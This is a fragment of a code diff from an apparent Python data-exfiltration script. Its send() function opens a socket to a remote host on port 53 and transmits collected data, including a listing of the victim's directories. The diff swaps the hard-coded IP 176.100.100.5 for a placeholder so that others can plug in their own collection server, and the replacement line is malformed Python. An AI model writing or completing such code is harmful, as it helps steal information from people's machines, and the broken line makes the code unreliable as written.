@@ -25,7 +25,7 @@ pause = "       "
 data2 = f"directories : {directories}"
 
 def send(): # Send the data
-    s.connect(("176.100.100.5", 53))
+    s.connect((YOUR PORT HERE", 53))
     time.sleep(5)
     s.send(data1.encode())
     s.send(pause.encode())
